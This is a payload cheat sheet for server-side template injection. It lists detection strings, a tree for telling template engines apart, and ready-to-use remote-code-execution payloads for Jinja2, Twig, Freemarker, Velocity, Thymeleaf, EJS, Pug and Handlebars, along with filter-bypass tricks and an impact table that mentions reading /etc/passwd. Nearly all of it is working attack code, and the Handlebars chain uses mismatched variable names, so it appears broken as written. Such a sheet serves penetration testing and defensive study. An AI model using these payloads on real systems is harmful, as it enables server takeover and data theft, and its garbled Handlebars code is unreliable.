# SSTI — Payload Cheatsheet

## Detection Payloads

### Polyglot Detection
```
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
{7*7}
{{7*'7'}}
```

### Engine Identification Tree
```
${7*7} = 49?
  YES → ${class.getClass()...} works?
    YES → Java (Freemarker / Velocity / Thymeleaf)
    NO  → Smarty (PHP)
  NO → {{7*7}} = 49?
    YES → {{7*'7'}} = 7777777?
      YES → Jinja2 (Python)
      NO  → Twig (PHP)
    NO  → #{7*7} = 49?
      YES → Ruby ERB / Slim
      NO  → <% 7*7 %> = 49?
        YES → EJS / Pug (Node.js)
        NO  → Not SSTI or unknown engine
```

## Engine-Specific Payloads

### Jinja2 (Python)
```python
# Read config
{{config}}
{{config.items()}}

# RCE
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}
# Find subprocess.Popen index first

# Shortcut (Python 3)
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request.application.__self__._get_data_for_json.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{app.request.server.get('DOCUMENT_ROOT')}}
```

### Freemarker (Java)
```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Velocity (Java)
```
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
```

### Thymeleaf (Java)
```
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

### EJS (Node.js)
```
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

### Pug (Node.js)
```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync('id');return sh}()}
```

### Handlebars (Node.js)
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |cod498|}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this.constructor.constructor "return require('child_process').execSync('id')"}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Filter Bypass
```python
# Jinja2 — bypass _ filter
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
# Using |attr() chain
# Using request.args or request.values for payload injection
{{request.application.__self__._get_data_for_json.__globals__.__builtins__[request.args.cmd](request.args.arg).read()}}
# URL: ?cmd=__import__&arg=os
```

## Validation Criteria

1. Template expression evaluated (not just reflected)
2. Engine identified by behavior (not guessing)
3. Impact demonstrated beyond template evaluation (file read or RCE)
4. Works in realistic user context

## Impact Escalation

| Impact | What to demonstrate |
|--------|-------------------|
| Info disclosure | Read config, environment variables |
| File read | Read /etc/passwd or equivalent |
| RCE | Execute OS commands |
| Persistent | Payload stored and re-evaluated |
